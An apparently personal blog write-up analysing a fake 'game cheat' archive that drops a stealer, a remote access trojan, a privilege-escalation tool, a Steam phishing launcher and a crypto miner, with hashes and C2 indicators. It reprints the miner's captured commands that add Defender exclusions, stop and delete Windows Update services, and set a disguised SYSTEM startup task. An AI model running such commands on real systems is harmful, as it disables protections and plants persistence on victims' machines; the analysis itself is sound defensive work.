# First writeup: Reversing a "Game Cheat" ;)

### One day I was chilling on Telegram, when someone who shared a group with me decided to mass spread some leaked game cheats & other tools! Lets take a look and see if they are what they say they are... 

Now I've never spoken to this person in my life, and at first i just thought it was someone advertising their cheat software and that was all, so I initially responded with how you would respond to any random person who sends you something you dont need:

<img src="/images/message.png" alt= "The message in question" width="50%" height="50%">

However, after looking at the website, I recognized it from somewhere, I'm not sure where exactly, but something in my head told me that this was a template that is being used to serve malware instead of actual cheats/tools.

<img src="/images/website.png" alt= "The website" width="70%" height="70%">

This was when I messaged the guy back saying "wait this is malware isnt it LOL".

After browsing around on the website for a while, I ended up downloading the "COD Warzone: Wallhack / ESP / NoRecoil / Aimbot" which came in the form of a .RAR file, named "Gloader by Dv9.rar".

**It's also pretty funny to see at the bottom it says "1. Turn off Windows defender / Antivirus (as all cheats are detected due to false-positive code)". Cmon hackermanz, couldn't you afford a decent crypter? 🤣**

To be fair though, a lot of legitimate cheats are still detected as false positives, or "HackTools". So disabling Windows Defender in order to get your super cool cheat working is normal to the victims who download them.

<img src="/images/codcheat.png" alt= "CodCheat" width="70%" height="70%"> 

<img src="/images/gloader.png" alt= "Gloader" width="60%" height="60%">

Opening up the file and extracting it to my Live Malware folder, I saw we had a few files and folders:

<img src="/images/thefiles.png" alt= "The files" width="60%" height="60%">

## Dropper Analysis.

The "Gloader.exe" is the only thing interesting, the folders are just there to make it look more "legit" and like it does something, and the Preferences file has nothing interesting or related to the malware either.

Running the Gloader.exe through DetectItEasy, I saw it was a .NET v4.0 executable.

<img src="/images/die.png" alt= "DetectItEasy" width="60%" height="60%">

Now, since the file is a .NET file, I used **dnSpy** to open it up and take a closer look at what it was doing.
And it didn't take too long for me to figure that out, since there was only one function in the executable, named: ```yutvfwkl```

<img src="/images/dnspy.png" alt= "dnSpy" width="75%" height="75%">

I could tell the big string block was a Base64 encoded Powershell command, loading it into CyberChef and decoding it confirmed this.

<img src="/images/cychef.png" alt= "CyberChef" width="70%" height="70%">

This is kinda annoying to read, so I used my favorite text editor Sublime Text to remove all of the **"."'s** inbetween every single letter.

Before:

<img src="/images/before.png" alt= "before" width="70%" height="70%">

After:

<img src="/images/after.png" alt= "after" width="70%" height="70%">

A lot easier to read!
Looking through this command, at first it is making a fake message box pop up that says **"No VM/VPS allowed! Try running on a real device!"**. Keep in mind there are no checks for VM applications or anything, this is just a fake message box to confuse the victim into thinking something is wrong with their computer meanwhile the malware fully executes in the background.

After the fake message box, the malware adds itself to the Windows Defender Exclusion list, pretty normal evasion technique here. Following that, the malware downloads and executes files from ```https://rentry.org/ebg7e/raw```, this is more likely the actual malware which will be dropped onto the device. Lets take a browse to that link:

<img src="/images/reentry.png" alt= "reentry" width="70%" height="70%">

Not gonna lie, i wasn't expecting **5** different exe files, looks like I've got a lot more analysing to do...

## Analysing the real malware.

To save time and to not fill this whole page up with screenshot of each individual malware, I'm going to list the information from DetectItEasy & PEBear here:

**The first binary:** **```LEMON.exe```**
- Microsoft Visual C/C++ Compiled.
- MD5: ```6d5f74f263d5ab9b0e3315b495eb72d5```
- Heavily Obfuscated, lots of Anti-Analysis & Anti-Debugging techniques.

Unfortunately, I don't have IDA Pro and I'm still learning when it comes to going deep into malware with reverse engineering and I wasn't able to understand much to do with this file, however, thankfully websites like ```app.any.run``` exist! This website does live dynamic analysis on files, making it easy for anyone to understand what is going on.

Turns out the file was a build of **Rhadamanthys Stealer**, a new Stealer malware designed to steal Crypto Coins, System Information, and execute separate processes such as Powershell.

[You can take a look at the Any.Run scan here (click me!)](https://app.any.run/tasks/2e3aea94-e1a3-4dab-95fd-1ec803aae2ef)

**The second binary:** **```LEM.exe```**
- Also Microsoft Visual C/C++ Compiled.
- MD5: ```edf0360a7aab3d02e4f99f85dfa2d0fa```
- Extremely noisy, drops the same RAT binary multiple times
- Adds Windows Defender Exclusions for the entire C: Drive and every single folder inside of it? A bit strange 🤣
- Also adds about a million scheduled tasks to execute each previously dropped RAT binary.

Upon execution of this **LEM.exe** file, it immediately drops multiple other RAT binaries, they are named: 
- **BlockNet.exe**
- **SearchIndexer.exe**
- **OSPPSVC.exe**
- **lsass.exe**
- **dwm.exe**
- **dllhost.exe**
- **lsm.exe**
- **taskeng.exe**
- **ctfmon.exe**
- **System.exe**
- **15d52deeb054a73b130d4cbd0fb351b54021f4f6.exe**

What's funny is... **All of these binaries have the exact same MD5 hash, compilation time & file size, they are identical...**

MD5 for all 11 dropped binaries: ```8c855395009a5d4b17ef2849fca409fa```

<img src="/images/lemexe.png" alt= "lemexe" width="70%" height="70%">

As I said before as well, it also adds Windows Defender Exclusions for the entire C: drive, and every single folder within it. I think the C: drive alone would have been good enough, but oh well...

Regarding the "million scheduled tasks" I spoke about earlier, these are all tasks to execute all 11 of these binaries on startup.

The most interesting binary out of all of these 11 is **SearchIndexer.exe**, since it is the only one that actually executes and connects to the CnC server. (The other 10 binaries are just dropped and their respective scheduled startup task is added)

**Here is the CnC information:**
- IP: 195.3.223.218
- Destination Port: 80

Looking up the **SearchIndexer.exe** file on VirusTotal shows us that the file is a DCRAT binary.

<img src="/images/av1.png" alt= "av1" width="70%" height="70%">

<img src="/images/av2.png" alt= "av2" width="70%" height="70%">

So, we have a Rhadamanthys Stealer, and DCRAT. I wonder what we will run into with the next binary... Ransomware maybe? LOL

**The third binary:** **```LicGet.exe```**
- .NET v4.0 Executable
- MD5: ```2b125292307de39b8be71d73a8eb2f8f```
- Prompts UAC on execution.

Opening the file in dnSpy, it is a fairly simple and small file with not much happening. First, the file checks to see if it is running as Administrator or not, given that the file prompts UAC when opened, most unknowing people would click Yes. This will give the process Administrator privileges, and then move to the ```jumptoSys``` function. If you click No on the UAC prompt, the file moves to the ```Disable``` function. 

<img src="/images/checkadmin.png" alt= "checkadmin" width="70%" height="70%">

Looking at the ```jumptoSys``` function, it's concept is to use the WinAPI's ```GetProcessByName``` method to get the Process Token of the ```winlogon``` process, which runs with Administrator privileges. It then duplicates this token and creates a new process using the duplicated token, this is probably to migrate the **LicGet.exe** process to a less obvious one, since ```winlogon``` is known to run with Administrator privileges.

<img src="/images/jumptosysfunc.png" alt= "jump2sys" width="70%" height="70%">

On the other hand, looking at the ```Disable``` function, it's concept is slightly different, it again uses the WinAPI's ```GetProcessByName``` method to get the Process Token, but instead of targeting the ```winlogon``` process, it targets the ```MsMpEng``` process, this process is the core process of the Windows Defender Anti-malware Application, and also runs with Administrator privileges. 

It looks like the ```Disable``` functions job is to emulate the ```MsMpEng``` process token, then allocate new memory and set the process token information to the same process token as the ```MsMpEng``` process, giving the **LicGet.exe** process Administrator privileges.

<img src="/images/disablefunc.png" alt= "disable" width="70%" height="70%">

By the way, I could be completely wrong with this process, but thats what it looks like haha, as I say I'm still learning.

Both functions use the ```advapi32.dll``` DLL to perform these token impersonation actions.

Apart from that, there isnt much else, I think this is just used for privilege escalation. There is also a ```GetProcessOwner``` function, which from what I can see, it's in the name lol, it just gets the owner of the processes that it's targeting. 

**The fourth binary:** **```ezzzzzzz.exe```**
- PureBasic Compiled (???)
- MD5: ```18e5764810cfb3bdb2ebec7d2d276fdd```

After skimming through the file with Ghidra, and looking at the strings list, there wasn't much information that was popping out to me, ```app.any.run``` didn't want to run the file, it would just throw an error. This meant I had to actually open the file and debug it myself to see what it was doing.

So I fired up my FlareVM (shoutout Mandiant), and put the binary on the system, first I ran it with FakeNet-NG, which is some software which emulates a network connection and keeps a log of any C2 connection activity or external files being downloaded. But alas, I didn't find anything here.

Next, I opened up **Process Hacker** and **x64dbg**, Process Hacker showed me that the binary was opening a cmd shell and executing some hidden commands from that, so I tried to find the place in memory where this was happening with x64dbg. Now, I am not very experienced with this tool but I am trying to learn it as it is one of the more popular debuggers out there and its apparently very good for malware analysis. Unfortunately, I wasn't able to find the address in memory where the cmd shell was being executed so i couldnt analyse it further, but I knew something was happening in that cmd shell and I wasn't going to stop until i found out what it was.

Finally, I opened up **ProcMon** to monitor what processes the binary was opening and what else it was doing under the hood. I created a filter for **"if (Process Name) is ("cmd.exe") then (include) in the list.** I opened the binary and this worked perfectly, I was able to see the commands that the cmd shell was running.

<img src="/images/ezbat.png" alt= "batcommand" width="90%" height="90%">

As you can see, the cmd shell was executing a **.bat** file, and because .bat files essentially are cmd shells when they are executed, I was able to see what this .bat file was doing after execution. To me, it looked like it was creating a bunch of registy entries, possibly something to do with persistence? I wasn't too sure.

After all of this, the binary finally opens a browser and redirects to the domain ```antileaktab.com``` 

<img src="/images/ezedge.png" alt= "ezedge" width="90%" height="90%">

<img src="/images/antileak.png" alt= "antileak" width="70%" height="70%">

When you click on "Sign in with Steam", a seperate browser box opens, which prompts you to login with your Steam credentials, this is a fake phishing page intended to steal your Steam login, ***just in case Rhadamanthys Stealer & DCRAT wasn't enough*** 🤣

<img src="/images/phish.png" alt= "phish" width="70%" height="70%">

VirusTotal gives the binary a 25/70 detection rate, interestingly Fortinet call it a "CoinMiner", maybe i missed something or it's just too well obfuscated for me haha. Soon I will learn the ways of debugging anti-debugging and analysing anti-analysis!

<img src="/images/ezzzvt.png" alt= "ezvt" width="70%" height="70%">

**The fifth (and final) binary:** **```meMin.exe```**
- GNU Linker (???)
- MD5: ```d5a3aaa28767c4fcf4ba7398fd841cb0```
- Prompts UAC on execution.
- VirusTotal says the binary connects to ```xmr.2miners.com```, highly suggesting this is XMR Miner malware.

Once again, this binary wasn't able to be ran within ```app.any.run``` for initial analysis, so I fired up FlareVM and again used Process Hacker & ProcMon to monitor what the binary was doing.

After executing the binary and letting its execution flow freely, I started to see some Powershell and cmd.exe activity in ProcMon, it seemed at first it was creating a Windows Defender Exclusion for itself with the following command:

```powershell.exe Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force```

<img src="/images/1powerexclude.png" alt= "exclusion" width="85%" height="85%">

After that, it used cmd.exe to stop some services and use the ```reg delete``` command to delete some entries in the Registry with the following command:

```cmd.exe /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\UsoSvc" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\bits" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\dosvc" /f```

<img src="/images/2cmdstopservice.png" alt= "cmdstopservice" width="85%" height="85%">

The binary stops & deletes the registry entries for the following services:
1. **```UsoSvc```**
2. **```WaaSMedicSvc```**
3. **```wuauserv```**
4. **```bits```**
5. **```dosvc```**

**But why?:**
- **```UsoSvc```** is the **Windows Update Orchestrator Service** and is a critically needed service that is required by Windows to scan, download, and install new Windows Updates to your computer.
- **```WaaSMediaSvc```** is the **Windows Update Medic Service**. The entire purpose of this service is to fix any damages suffered by the Windows Update components, so that you can continue to receive the Windows updates without any interruption.
- **```wuauserv```** is the **Windows Update Service**, it provides direct access to the updates of the Windows operating system.
- **```bits```** stands for **Background Intelligent Transfer Service**. It is used to download files from or upload files to HTTP web servers and SMB file shares, it is most likely the malware is disabling this service so the previously mentioned Update services cannot reach out to the Windows Update servers to download the latest updates.
- **```dosvc```** is the **Delivery Optimization Service**, it ensures reliable and secure downloads of content or Windows Updates.

*I guess the binary REALLY doesn't want us to get the latest security updates..* 🤣

Next up, the binary copies itself & adds itself to startup with Administrator privileges, renaming itself to ```updater.exe``` with the following command:

```powershell.exe <#xjwvbygm#> IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { IF([System.Environment]::OSVersion.Version -lt [System.Version]"6.2") { schtasks /create /f /sc onlogon /rl highest /ru 'System' /tn 'GoogleUpdateTaskMachineQC' /tr '''C:\Program Files\Google\Chrome\updater.exe''' } Else { Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\updater.exe')  -Trigger (New-ScheduledTaskTrigger -AtStartup)  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000))  -TaskName 'GoogleUpdateTaskMachineQC' -User 'System' -RunLevel 'Highest' -Force; } } Else { reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "GoogleUpdateTaskMachineQC"/t REG_SZ /f /d 'C:\Program Files\Google\Chrome\updater.exe' }, ```

<img src="/images/3powerupdater.png" alt= "3powerupdater" width="80%" height="80%">

Finally, just in case the second cmd.exe command didn't work, cmd.exe runs all the commands again, but this time, one-by-one.

<img src="/images/4cmdstopservice2.png" alt= "4cmdstopservice" width="75%" height="75%">

Again, VirusTotal says that this binary connects to ```xmr.2miners.com```, so it is a highly probable chance that this is some XMR mining malware.

So, overall, what do we have here?
1. **A build of Rhadamanthys Stealer**
2. **A build of DCRAT**
3. **Some sort of privilege escalation/token impersonation method**
4. **A binary that opens a Steam Login phishing page**
5. **Probably an XMR Miner and Windows Update Service disabler**

All of which enable themselves to execute on startup, ensuring persistence on the victims device.

Oh and incase you were wondering, all of the "Cheats", "Spoofers", "Cracked Paid Software" etc etc all download the same **"Gloader by Dv9.rar"** archive.

<img src="/images/allthesame.png" alt= "4cmdstopservice" width="70%" height="70%">

<img src="/images/gloader.png" alt= "Gloader" width="60%" height="60%">


### I think that wraps up just about everything to do with this/these malware(s)!

## Thank you for reading, and stay tuned for my next writeup! :)
